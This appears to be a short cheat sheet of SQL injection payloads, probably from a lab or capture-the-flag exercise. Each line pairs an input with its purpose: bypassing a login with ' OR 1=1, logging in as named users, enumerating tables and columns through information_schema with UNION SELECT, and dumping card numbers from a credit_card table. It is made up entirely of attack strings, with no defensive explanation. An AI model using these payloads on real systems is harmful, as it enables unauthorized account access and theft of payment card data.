' OR 1=1 -- ' (dump entire table as pwd)
%'-- ' (dump entire table as uname)
aryan'-- ' (get access to aryan as uname)
agnes'-- ' (get access to agnes as uname)
%' UNION (SELECT 1, 2, 3 FROM dual) -- ' (output queries to the screen as uname)
%' UNION (SELECT 3, TABLE_NAME, TABLE_SCHEMA FROM information_schema.tables) -- ' (get table names as uname)
%' UNION (SELECT 2, COLUMN_NAME, 3 FROM information_schema.columns WHERE TABLE_NAME='credit_card') -- ' (get credit card column name as uname)
%' UNION (SELECT id, user_name, cNum FROM credit_card) -- ' (get credit card info as uname)